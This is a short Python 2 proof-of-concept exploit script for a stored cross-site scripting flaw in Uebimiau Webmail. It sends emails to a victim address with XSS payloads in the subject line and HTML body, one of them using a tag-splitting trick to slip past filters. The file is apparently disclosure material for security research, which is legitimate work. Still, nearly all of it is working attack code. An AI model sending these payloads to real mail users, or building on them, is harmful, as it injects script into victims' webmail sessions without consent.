import smtplib
 
print "###############################################"
print "#      Uebimiau Webmail Stored XSS POC        #"
print "#            Coded by: Shai rod               #"
print "#               @NightRang3r                  #"
print "#           http://exploit.co.il              #"
print "#       For Educational Purposes Only!        #"
print "###############################################\r\n"
 
# SETTINGS
 
sender = "attacker@localhost"
smtp_login = sender
smtp_password = "qwe123"
recipient = "victim@localhost"
smtp_server  = "10.0.0.5"
smtp_port = 25
subject = "Uebimiau Webmail Stored XSS POC"
xss_payload_1 = """ "><img src='1.jpg'onerror=javascript:alert("XSS")>"""
xss_payload_2 =  """<scr<script>ipt></scr</script>ipt>'//\';alert(String.fromCharCode(88,83,83))//\";</script>"""
# SEND E-MAIL
 
print "[*] Sending E-mail to " + recipient + "..."
msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
       % (sender, ", ".join(recipient), subject + xss_payload_1) )
msg += "Content-type: text/html\n\n"
msg += """Nothing to see here...\r\n"""
msg += xss_payload_2
server = smtplib.SMTP(smtp_server, smtp_port)
server.ehlo()
server.starttls()
server.login(smtp_login, smtp_password)
print "[*] Sending Message 1\r"
server.sendmail(sender, recipient, msg)
print "[*] Sending Message 2\r"
server.sendmail(sender, recipient, msg)
server.quit()
print "[+] E-mail sent!"

